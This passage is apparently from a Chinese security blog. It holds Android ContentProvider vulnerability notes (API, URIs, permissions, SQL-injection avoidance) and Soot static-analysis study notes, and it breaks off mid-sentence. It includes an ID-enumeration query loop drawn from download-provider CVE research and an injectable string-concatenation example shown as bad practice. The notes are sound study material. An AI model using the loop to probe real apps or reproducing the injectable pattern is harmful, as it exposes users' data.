</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-12T09:40:48.000Z" title="2022/6/12 17:40:48">2022-06-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-14T10:31:26.569Z" title="2022/6/14 18:31:26">2022-06-14</time></span><span class="level-item">6 minutes read (About 951 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/12/ContentProvider%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/">ContentProvider漏洞笔记</a></p><div class="content"><h1 id="ContentProvider介绍"><a href="#ContentProvider介绍" class="headerlink" title="ContentProvider介绍"></a>ContentProvider介绍</h1><p><code>ContentProvider</code>的主要目的是为应用程序之间共享数据提供渠道。<code>ContentProvider</code>以一个或多个表的形式将数据呈现给外部应用，这些表与关系型数据库中的表类似。行表示提供程序收集的某种类型数据的实例，行中的每一列表示为一个实例所收集的单个数据。</p>
<p>其他组件和 <code>ContentProvider</code>之间的关系：</p>
<p><img src="https://developer.android.com/guide/topics/providers/images/content-provider-tech-stack.png?hl=zh-cn" alt="内容提供程序与其他组件的关系。"></p>
<h2 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h2><p><img src="https://developer.android.com/guide/topics/providers/images/content-provider-interaction.png?hl=zh-cn" alt="内容提供程序、其他类和存储空间之间的交互。"></p>
<p>示例代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> <span class="built_in">this</span>.getContentResolver();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> minId; id &lt; maxId; id++) &#123;</span><br><span class="line">            <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(PUBLIC_DOWNLOADS_ID_URI + id);</span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    lastId = Math.max(id, lastId);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">                    cur.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Content-URI"><a href="#Content-URI" class="headerlink" title="Content URI"></a>Content URI</h2><p><strong>内容 URI</strong> 用来标识数据。内容 URI 包括整个提供程序的符号名称（其 <strong>授权</strong> ）和指向表的名称（ <strong>路径</strong> ）。格式如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//user_dictionary/words</span></span><br></pre></td></tr></table></figure>

<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p><code>ContentProvider</code>提供的 <code>API</code>类似于 <code>SQL</code>语句，主要有 <code>query</code>、<code>insert</code>、<code>update</code>、<code>delete</code>和 <code>getType</code>等。</p>
<h3 id="query"><a href="#query" class="headerlink" title="query()"></a>query()</h3><p><a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/ContentResolver?hl=zh-cn#query(android.net.Uri,%20java.lang.String%5B%5D,%20android.os.Bundle,%20android.os.CancellationSignal)"><code>ContentResolver.query()</code></a> -&gt; <a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/ContentProvider?hl=zh-cn#query(android.net.Uri,%20java.lang.String%5B%5D,%20android.os.Bundle,%20android.os.CancellationSignal)"><code>ContentProvider.query()</code></a>，示例代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Queries the user dictionary and returns results</span></span><br><span class="line">cursor = getContentResolver().query(</span><br><span class="line">    UserDictionary.Words.CONTENT_URI,   <span class="comment">// The content URI of the words table</span></span><br><span class="line">    projection,                        <span class="comment">// The columns to return for each row</span></span><br><span class="line">    selectionClause,                   <span class="comment">// Selection criteria</span></span><br><span class="line">    selectionArgs,                     <span class="comment">// Selection criteria</span></span><br><span class="line">    sortOrder);                        <span class="comment">// The sort order for the returned rows</span></span><br></pre></td></tr></table></figure>

<p><code>query()</code>与 <code>sql</code>查询的比较：</p>
<table>
<thead>
<tr>
<th align="center">query() 参数</th>
<th align="center">SELECT 关键字&#x2F;参数</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>Uri</code></td>
<td align="center"><code>FROM table_name</code></td>
<td align="center"><code>Uri</code> 映射至提供程序中名为 table_name 的表。</td>
</tr>
<tr>
<td align="center"><code>projection</code></td>
<td align="center"><code>col,col,col,...</code></td>
<td align="center"><code>projection</code> 是检索到的每个行所应包含的列的数组。</td>
</tr>
<tr>
<td align="center"><code>selection</code></td>
<td align="center"><code>WHERE col = value</code></td>
<td align="center"><code>selection</code> 指定选择行的条件。</td>
</tr>
<tr>
<td align="center"><code>selectionArgs</code></td>
<td align="center">（没有完全等效项，选择参数会替换选择子句中的 <code>?</code> 占位符。）</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>sortOrder</code></td>
<td align="center"><code>ORDER BY col,col,...</code></td>
<td align="center"><code>sortOrder</code> 指定在返回的 <code>Cursor</code> 中各行的显示顺序。</td>
</tr>
</tbody></table>
<h2 id="规避SQL注入的方式"><a href="#规避SQL注入的方式" class="headerlink" title="规避SQL注入的方式"></a>规避SQL注入的方式</h2><p>对SQL语句的操作不要使用串联的方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Constructs a selection clause by concatenating the user&#x27;s input to the column name</span></span><br><span class="line"><span class="type">String</span> <span class="variable">selectionClause</span> <span class="operator">=</span> <span class="string">&quot;var = &quot;</span> + userInput;</span><br></pre></td></tr></table></figure>

<p>应该使用占位符与单独的查询参数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Constructs a selection clause with a replaceable parameter</span></span><br><span class="line"><span class="type">String</span> <span class="variable">selectionClause</span> <span class="operator">=</span>  <span class="string">&quot;var = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Defines an array to contain the selection arguments</span></span><br><span class="line">String[] selectionArgs = &#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sets the selection argument to the user&#x27;s input</span></span><br><span class="line">selectionArgs[<span class="number">0</span>] = userInput;</span><br></pre></td></tr></table></figure>

<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>查询分为两步：</p>
<ol>
<li>请求对提供程序的读取访问权限。</li>
<li>将操作语句发送至提供程序。</li>
</ol>
<p>对 <code>ContentProvider</code>的访问权限是在应用程序的 <code>&lt;use-permission&gt;</code>中指定的，无法动态申请。</p>
<p>如果仅使用 <code>ContentProvider</code>在自己的应用之间共享数据，最好将使用的 <code>android:protectionLevel </code>属性设置为 <code>signature</code> 保护级别。</p>
<p>还可以通过以下方式提供更细化的访问权限：声明 <code>android:grantUriPermissions</code>属性，并使用用来启动组件的 <code>Intent</code>对象中的 <code>FLAG_GRANT_READ_URI_PERMISSION</code>和 <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>标记。</p>
<ul>
<li><code>android:grantUriPermissions</code> : 默认为 <code>false</code>, 当为 <code>false</code>时需要增加 <code>&lt;grant-uri-permission&gt;</code>来指定允许临时权限访问的具体 <code>Content URI</code>, 设置为 <code>true</code>时表示整个 <code>Provider</code>都接受临时权限访问数据。</li>
<li><code>&lt;grant-uri-permission&gt;</code> : 用于指定具体的 <code>Content URI</code>, 和 <code>Path-level</code>权限的 <code>&lt;path-permisson&gt;</code>类似。</li>
<li><code>FLAG_GRANT_READ_URI_PERMISSION</code>和 <code>FLAG_GRANT_WRITE_URI_PERMISSION</code> : 配合 <code>Intent.setFlags</code>让 <code>Intent</code>中的 <code>URI</code>能够被无权限的 <code>app</code>临时访问。</li>
<li>没有<code>&lt;path-permisson&gt;</code>的，就是没有访问权限。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</a></p>
<p><a target="_blank" rel="noopener" href="https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/">https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-12T09:30:00.000Z" title="2022/6/12 17:30:00">2022-06-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-12T09:40:33.626Z" title="2022/6/12 17:40:33">2022-06-12</time></span><span class="level-item">23 minutes read (About 3379 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/12/Soot%E7%AC%94%E8%AE%B0/">Soot笔记</a></p><div class="content"><h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>给定一个输入程序，输出程序的属性。</p>
<h2 id="Rice-定律"><a href="#Rice-定律" class="headerlink" title="Rice 定律"></a>Rice 定律</h2><p>在一个即<strong>递归可枚举</strong>(recursively enumerable)语言中，任何程序行为的 <strong>non-trivial</strong> 属性都是不可解释的。<strong>non-trivial</strong> 属性指的是那些与程序运行行为有关的属性。</p>
<p>即<strong>不存在完美的静态分析</strong>。</p>
<img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202140954018.png-water_print" style="zoom: 33%;" />

<p>国内课程：<a target="_blank" rel="noopener" href="https://xiongyingfei.github.io/SA/2021/main.htm">北大熊英飞</a>、<a target="_blank" rel="noopener" href="https://pascal-group.bitbucket.io/teaching.html">南大</a>及南大B站的<a target="_blank" rel="noopener" href="https://space.bilibili.com/2919428">视频</a>。</p>
<h2 id="调用图"><a href="#调用图" class="headerlink" title="调用图"></a>调用图</h2><p>一个调用图就是从调用点到目标方法的<strong>一系列调用边</strong>。</p>
<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202190937291.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202190937291.png-water_print"></p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="CHA"><a href="#CHA" class="headerlink" title="CHA"></a>CHA</h3><p>论文<a target="_blank" rel="noopener" href="http://web.cs.ucla.edu/~palsberg/tba/papers/dean-grove-chambers-ecoop95.pdf">地址</a>。</p>
<h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ul>
<li>需要首先获得整个程序的类继承关系图</li>
<li>通过接收变量的声明类型来解析 Virtual call<ul>
<li>接收变量的例子：在 <code>a.foo()</code> 中，a 就是接收变量</li>
</ul>
</li>
<li>假设一个接收变量能够指向 A 或 A 的所有子类</li>
</ul>
<h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><p>通过 CHA 算法寻找到某个程序调用点对应的可能的目标函数实体。</p>
<img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202191001784.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202191001784.png-water_print" style="zoom:50%;" />

<ul>
<li>call site(cs) 就是调用语句，m(method) 就是对应的函数签名。</li>
<li>T 集合中保存找到的结果</li>
</ul>
<h4 id="static-call"><a href="#static-call" class="headerlink" title="static call"></a>static call</h4><p>静态方法调用前写的是类名，而非静态方法调用前写的是变量或指针名。静态方法调用不需要依赖实例，所以直接加到集合 T 中。</p>
<h4 id="special-call"><a href="#special-call" class="headerlink" title="special call"></a>special call</h4><p>使用 <code>super</code> 类的调用方法。<code>foo()</code> 虽然在当前类有定义，但是实际使用的是父类的 <code>foo()</code>，因此需要使用 <code>Dispatch</code> 函数。其中的 <code>foo()</code> 的签名 <code>m</code> 由编译器返回信息可知是父类 <code>B</code> 的，那么获取 <code>foo()</code> 返回值的 <code>c</code> 也指向 <code>B</code>，也就相当于在父类中寻找了。</p>
<h4 id="virtual-call"><a href="#virtual-call" class="headerlink" title="virtual call"></a>virtual call</h4><p>这是<code>CHA</code> 区别于其他算法的主要之处。该算法会对此方法做一个 <code>Dispatch(c,m)</code> 并将 <code>c</code> 的所有子集以及子集的子集全都做一次 <code>Dispatch(c&#39;, m)</code>。直观来看，可以分为两步，第一步是对本身做一次 <code>Dispatch</code>，看看当前类中是否有 <code>foo()</code>，没有的话就到父类中递归地找；第二步是在当前类地所有子集中找到所有的 <code>foo()</code>，然后将这些 <code>foo</code> 同第一步找到的 <code>foo</code> 全都加入 <code>T</code> 中。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/picture3.png" alt="2022-06-01-8.47.38" style="zoom:50%;" />

<p>一个🌰：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/picture2.png" alt="2022-06-01-8.49.48" style="zoom:50%;" />

<h4 id="CHA-的特征"><a href="#CHA-的特征" class="headerlink" title="CHA 的特征"></a>CHA 的特征</h4><ol>
<li>只考虑类继承结构，所以<strong>很快</strong></li>
<li>因为忽略了数据流和控制流的信息，所以<strong>不太准确</strong></li>
</ol>
<h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>论文<a target="_blank" rel="noopener" href="https://plg.uwaterloo.ca/~olhotak/pubs/sable-paper-2003-1.ps">地址</a>。</p>
<p>通过使用 <code>PointsTo Analysis</code> 找到变量的实际类型来准确地处理这种情况。与 <code>CHA</code> 相比，<code>SPARK</code> 去除了许多虚假边缘；但是，它要慢得多，并且可能会漏掉一些真正的边。</p>
<h2 id="指针分析"><a href="#指针分析" class="headerlink" title="指针分析"></a>指针分析</h2><h3 id="指针分析要解决的问题"><a href="#指针分析要解决的问题" class="headerlink" title="指针分析要解决的问题"></a>指针分析要解决的问题</h3><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/picture1.png" alt="2022-05-30-9.32.31" style="zoom:50%;" />

<p>程序中的指针指向哪个内存的问题，<code>Java</code>语言中的指针分析指的是一个指针指向程序中的哪个对象（<code>Object</code>)的问题。通常指针分析是一个<code>may-analysis</code>，分析的结果通常是一个指针<strong>可能</strong>指向哪些对象。</p>
<h3 id="指针分析的应用"><a href="#指针分析的应用" class="headerlink" title="指针分析的应用"></a>指针分析的应用</h3><ul>
<li>可以用来计算其他基本信息（别名分析，调用图…)。</li>
<li>编译优化。</li>
<li>找Bug。</li>
<li>安全性分析。</li>
<li>……</li>
</ul>
<p>指针分析是最基础的静态分析之一，也是很多其他分析的基础。</p>
<h1 id="Soot"><a href="#Soot" class="headerlink" title="Soot"></a>Soot</h1><p><code>soot</code>有很多<code>Option</code>配置，可以参考<a target="_blank" rel="noopener" href="https://soot-oss.github.io/soot/docs/4.4.0-SNAPSHOT/options/soot_options.html#options">这里</a>或者<a target="_blank" rel="noopener" href="https://github.com/Sable/soot/wiki/Introduction:-Soot-as-a-command-line-tool">这里</a>。</p>
<h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><h3 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h3><p>介于 <code>Java</code> 和 <code>Java</code> 字节码之间，是一个基于语句的、类型化的（每个变量都有一个类型）和 <code>3-addressed</code>（每条语句最多有 3 个变量）的中间表示。</p>
<blockquote>
<p>三地址码，一条指令的右侧最多只有一个运算符，如 <code>x+y*z</code>表示为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t1 = y*z;</span><br><span class="line">t2 = x + t1;</span><br><span class="line">x = t2;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>调用方法：</p>
<ul>
<li><code>specialinvoke</code>：用于调用构造方法、父类方法、私有方法。</li>
<li><code>virtualinvoke</code>：用于调用普通的成员方法，进行<code>virtual dispatch</code>。</li>
<li><code>interfaceinvoke</code>：用于调用继承的接口的方法，不能做优化，需要检查是否实现了接口中的方法。</li>
<li><code>staticinvoke</code>：用于调用静态方法。</li>
</ul>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) r0 := <span class="meta">@this</span>: FizzBuzz</span><br><span class="line">(<span class="number">2</span>) i0 := <span class="meta">@parameter0</span>: <span class="type">int</span></span><br><span class="line">(<span class="number">3</span>) $i1 = i0 % <span class="number">15</span></span><br><span class="line">(<span class="number">4</span>) <span class="keyword">if</span> $i1 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i2</span> <span class="operator">=</span> i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">5</span>) $r4 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">6</span>) virtualinvoke $r4.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;FizzBuzz&quot;</span>) <span class="comment">// 尖括号内的是方法签名</span></span><br><span class="line">(<span class="number">7</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">8</span>) $i2 = i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">9</span>) <span class="keyword">if</span> $i2 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i3</span> <span class="operator">=</span> i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">10</span>) $r3 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">11</span>) virtualinvoke $r3.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Buzz&quot;</span>)</span><br><span class="line">(<span class="number">12</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">13</span>) $i3 = i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">14</span>) <span class="keyword">if</span> $i3 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$r1</span> <span class="operator">=</span> &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">15</span>) $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">16</span>) virtualinvoke $r2.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Fizz&quot;</span>)</span><br><span class="line">(<span class="number">17</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">18</span>) $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">19</span>) virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(<span class="type">int</span>)</span>&gt;(i0)</span><br><span class="line">(<span class="number">20</span>) <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="Shimple"><a href="#Shimple" class="headerlink" title="Shimple"></a>Shimple</h3><p>与<code>Jimple</code>基本相同，是<code>Jimple</code>静态单任务形式的中间表示。</p>
<h3 id="Baf"><a href="#Baf" class="headerlink" title="Baf"></a>Baf</h3><p>是流线型的基于栈的字节表示。将<code>java</code>字节码转为基于栈的代码。</p>
<h3 id="Grimp"><a href="#Grimp" class="headerlink" title="Grimp"></a>Grimp</h3><p>与<code>Jimple</code> 类似，比<code>Jimple</code>更接近于<code>java</code>源码。容易阅读，方便人工阅读。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>基本的数据结构如下：</p>
<ul>
<li><p><code>Scene</code>，是一个单例类，表示所分析的环境。</p>
</li>
<li><p><code>SootClass</code>，用于表示<code>Scene</code>中的类。</p>
</li>
<li><p><code>SootMethod</code>，用于表示<code>SootClass</code>中的方法。</p>
</li>
<li><p><code>Body</code>，使用<code>Body</code>来访问<code>SootMethod</code>中的各种信息，每个<code>Body</code>里面有三个主链，分别是<code>Units</code>链、<code>Locals</code>链、<code>Traps</code>链。。</p>
<ul>
<li><code>Local，</code>方法内的局部变量。</li>
<li><code>Trap</code>，方法内的异常处理。</li>
<li><code>Unit</code>，方法体内的语句。</li>
</ul>
</li>
</ul>
<p>还有四种<code>Body</code>，对应四种中间表示：<code>BafBody</code>、<code>JimpleBody</code>、<code>ShimpleBody</code>、<code>GrimpBody</code>，<code>Soot</code> 中的默认 <code>IR</code> 是 **<code>Jimple</code>**（<code>Java Simple</code>）。</p>
<h3 id="Unit（Jimple中是Stmt）"><a href="#Unit（Jimple中是Stmt）" class="headerlink" title="Unit（Jimple中是Stmt）"></a>Unit（Jimple中是Stmt）</h3><p>表示<code>Unit</code>语句。主要有以下几种：</p>
<ul>
<li>核心语句：<code>NopStmt</code>， <code>DefinitionStmt</code>(<code>IdentityStmt</code>， <code>AssignStmt</code>)。<ul>
<li><code>IdentityStmt</code>：通常指的是对变量赋值，这个变量既可以是显式的也可以是隐式的。</li>
<li>一个<code>IdentityStmt</code>将特殊值，如参数、<code>this</code>或被捕获的异常，分配给一个<code>Local</code>。</li>
<li>所有正常的赋值，例如从一个<code>Local</code>到另一个<code>Local</code>，或者从一个<code>Constant</code>到一个<code>Local</code>，都是用<code>AssignStmt</code>表示的。</li>
</ul>
</li>
<li>负责过程内控制流的语句：<code>IfStmt</code> ， <code>GotoStmt</code> ， <code>TableSwitchStmt</code> ， <code>LookupSwitchStmt</code>。</li>
<li>负责过程间的控制流语句：<code>InvokeStmt</code> ， <code>ReturnStmt</code> ， <code>ReturnVoidStmt</code>。</li>
<li>监控语句：<code>EnterMonitorStmt</code> ， <code>ExitMonitorStmt</code>。</li>
<li><code>ThrowStmt</code> ， <code>RetStm</code>。</li>
</ul>
<h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h3><ul>
<li><code>Local</code></li>
<li><code>Constant</code></li>
<li><code>Ref</code></li>
<li><code>Expr</code></li>
</ul>
<h4 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h4><p><strong>JimpleLocal</strong>：<code>local</code>变量</p>
<p><strong>TemporaryRegisterLocal</strong>： <code>$</code>开头的临时变量</p>
<p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210619180333086.png" alt="image-20210619180333086"></p>
<h4 id="Constant"><a href="#Constant" class="headerlink" title="Constant"></a>Constant</h4><p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210619182313742.png" alt="image-20210619182313742"></p>
<h4 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h4><p><code>ConcreteRef</code>：</p>
<ul>
<li><code>ArrayRef</code>：指向数组。</li>
<li><code>FieldRef</code>： 指向<code>field</code>。<ul>
<li><code>StaticFieldRef </code>：静态<code>field</code>的引用。</li>
<li><code>InstanceFieldRef</code> ：指向的<code>field</code>是一个对象实例。</li>
</ul>
</li>
</ul>
<p><code>IdentityRef</code>：</p>
<ul>
<li><code>CaughtExceptionRef </code>：指向捕获到的异常的引用</li>
<li><code>ParameterRef</code>：函数参数的引用</li>
<li><code>ThisRef</code> ：<code>this</code>的引用</li>
</ul>
<p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210619194142262.png"></p>
<h4 id="Expr"><a href="#Expr" class="headerlink" title="Expr"></a>Expr</h4><p>一般来说，一个<code>Expr</code>可以对若干个<code>Value</code>进行一些操作并且返回另一个<code>Value</code>。在<code>Jimple</code>中，强制要求所有的<code>Value</code><strong>最多包含一个表达式</strong>。</p>
<p><strong><code>Stmt</code>和<code>Expr</code>的区别</strong>：<code>Stmt</code>没有返回值，<code>Expr</code>有返回值。</p>
<h3 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h3><p><code>Box</code>是指针，提供了对<code>Soot</code>对象的间接访问。<strong>一个<code>Box</code>提供了一个间接访问<code>soot(Unit,Value)</code>的入口</strong>，类似于<code>Java</code>的一个引用。当<code>Unit</code>包含另一个<code>Unit</code>的时候，需要通过<code>Box</code>来访问，<code>Soot</code> 里提供了两种类型的<code>Box</code>, 一个是<code>ValueBox</code>一个是<code>UnitBox</code>。</p>
<ul>
<li><code>ValueBox</code>，指向<code>Values</code>：<ul>
<li>对于一条<code>Unit</code>来说，他的<code>ValueBox</code>存储的是在这条语句内部所<strong>用到</strong>的和<strong>所定义</strong>的语句。</li>
</ul>
</li>
<li><code>UnitBox</code>，指向<code>Units</code>：<ul>
<li>以<code>goto</code>语句为例，<code>UnitBox</code>其实存的就是<code>goto</code>所指的下一跳节点。</li>
<li><code>switch</code>语句，则会包含很多<code>boxes</code>。</li>
</ul>
</li>
</ul>
<p>还需要知道以下的规则：</p>
<ul>
<li>**一个<code>Unit</code>可以有多个<code>UnitBox</code>，但是每个<code>UnitBox</code>只能指向一个<code>Unit</code>**。<code>GotoStmt</code> 需要知道目标的<code>Unit</code>是什么，所以一个<code>Unit</code>会包含其它的<code>UnitBox</code>，通过 <code>UnitBox</code>获取下一个<code>Unit</code>。</li>
<li>**一个<code>Value</code>可以对应多个<code>ValueBox</code>，但是一个<code>ValueBox</code>只能对应一个<code>Value</code>**，对于一个<code>Unit</code>，可以得到很多个<code>ValueBox</code>，包含着这条语句内部的所用到和所定义的语句。</li>
</ul>
<p><img src="https://fynch3r.github.io/images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325104642746.png" alt="image-20210325104642746"></p>
<h2 id="基本API"><a href="#基本API" class="headerlink" title="基本API"></a>基本API</h2><p><img src="https://miro.medium.com/max/700/1*yIuXcna6Ag7-Par4YgmBnw.png"></p>
<h3 id="SootClass"><a href="#SootClass" class="headerlink" title="SootClass"></a>SootClass</h3><p>获取一个类的信息，如果类是在一个包里，则应该包含完整的包名：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass = Scene.v().getSootClass(<span class="string">&quot;Circle&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如果分析的类不在<code>Scene</code>中，则<code>getSootClass</code>将返回一个<code>Phantom</code>类或者是异常。<code>Phantom</code>类不影响分析的进行，这在不关注其他模块的代码时很有用。如果要确保查询的类存在，可以通过<code>getSootClassUnsafe(className, false)</code>（如果不存在，则结果为空）检索它或者使用<code>circleClass.isPhantom()</code>判断它是不是为<code>Phantom</code>类。</p>
<h3 id="SootField"><a href="#SootField" class="headerlink" title="SootField"></a>SootField</h3><p>类中包含字段和方法，通过名称和类型来查找它们：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SootField</span> <span class="variable">radiusField</span> <span class="operator">=</span> circleClass.getField(<span class="string">&quot;radius&quot;</span>, IntType.v())</span><br></pre></td></tr></table></figure>

<h3 id="SootMethod"><a href="#SootMethod" class="headerlink" title="SootMethod"></a>SootMethod</h3><img src="https://miro.medium.com/max/1400/1*ESTs9adMHZn7oHPWJo5e8w.png" style="zoom:67%;" />

<p>一般情况下使用<code>getMethodByName</code>即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">circleClass.getMethodByName(<span class="string">&quot;getCircleCount&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是对于方法重载，需要使用<code>getMethod</code>方法，并提供<code>Subsignature</code>：</p>
